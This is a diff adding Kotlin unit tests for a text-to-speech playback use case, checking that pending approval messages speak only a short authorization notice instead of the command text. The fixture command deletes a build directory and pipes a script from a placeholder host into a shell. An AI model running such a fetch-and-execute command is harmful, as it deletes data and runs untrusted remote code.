@@ -324,6 +324,70 @@ class PlayReplyUseCaseTest {
         coVerify(exactly = 0) { ttsPlayer.speak(any(), any(), any(), any(), any()) }
     }
 
+    // --- Hermes approval pointer (spokenText, issue #87) --------------------
+
+    private val approvalCommand = "rm -rf /tmp/build && curl -s https://example.invalid | sh"
+    private val approvalNotice = "There is a pending authorization request. Review it in Telegram when you are stopped."
+
+    private fun approvalMessage(id: String = "a1") = textMessage(id = id, text = approvalCommand)
+        .copy(spokenText = approvalNotice)
+
+    @Test fun `approval message speaks only the notice at the configured speed`() = runTest {
+        coEvery { settingsRepository.get() } returns defaultSettings.copy(playbackSpeed = 1.75f)
+
+        useCase.playTextMessage(approvalMessage(), isCallActive = false)
+
+        coVerify(exactly = 1) { ttsPlayer.speak(approvalNotice, any(), any(), 1.75f, any()) }
+        coVerify(exactly = 0) { ttsPlayer.speak(match { it.contains("rm -rf") || it.contains("curl") }, any(), any(), any(), any()) }
+    }
+
+    @Test fun `approval notice is spoken with the UI locale, not script detection`() = runTest {
+        val french = "Une demande d'autorisation est en attente. Consultez-la dans Telegram quand vous serez a l'arret."
+        coEvery { settingsRepository.get() } returns defaultSettings.copy(languageTag = "fr")
+
+        useCase.playTextMessage(approvalMessage().copy(spokenText = french), isCallActive = false)
+
+        coVerify { ttsPlayer.speak(french, java.util.Locale.forLanguageTag("fr"), any(), any(), any()) }
+    }
+
+    @Test fun `approval message keeps its original text in the stored row`() = runTest {
+        useCase.playTextMessage(approvalMessage(), isCallActive = false)
+
+        coVerify { messageRepository.update(match { it.textContent == approvalCommand && it.spokenText == approvalNotice }) }
+        coVerify(exactly = 0) { messageRepository.update(match { it.textContent != approvalCommand }) }
+    }
+
+    @Test fun `approval notice wins over summary in the summary playback path`() = runTest {
+        val msg = approvalMessage().copy(summary = "a summary of the command", summaryState = SummaryState.DONE)
+
+        useCase.playSummaryOrTranscription(msg, isCallActive = false)
+
+        coVerify { ttsPlayer.speak(approvalNotice, any(), any(), defaultSettings.playbackSpeed, any()) }
+        coVerify(exactly = 0) { ttsPlayer.speak(match { it != approvalNotice }, any(), any(), any(), any()) }
+    }
+
+    @Test fun `approval notice is also what manual replay speaks`() = runTest {
+        useCase.playTextManually(approvalMessage())
+
+        coVerify { ttsPlayer.speak(approvalNotice, any(), any(), defaultSettings.playbackSpeed, any()) }
+        coVerify(exactly = 0) { ttsPlayer.speak(match { it != approvalNotice }, any(), any(), any(), any()) }
+    }
+
+    @Test fun `approval message is queued like any message when autoplay is off`() = runTest {
+        coEvery { settingsRepository.get() } returns defaultSettings.copy(autoPlayReplies = false)
+
+        useCase.playTextMessage(approvalMessage(), isCallActive = false)
+
+        coVerify { pendingPlaybackDao.insert(match { it.reason == PendingReason.SILENT_MODE }) }
+        coVerify(exactly = 0) { ttsPlayer.speak(any(), any(), any(), any(), any()) }
+    }
+
+    @Test fun `message without spokenText still speaks its own text`() = runTest {
+        useCase.playTextMessage(textMessage(text = approvalCommand), isCallActive = false)
+
+        coVerify { ttsPlayer.speak(approvalCommand, any(), any(), defaultSettings.playbackSpeed, any()) }
+    }
+
     // --- stopAll resets state ---------------------------------------------
 
     @Test fun `stopAll preserves pending queue (v1_20_11) and refreshes notifier`() = runTest {
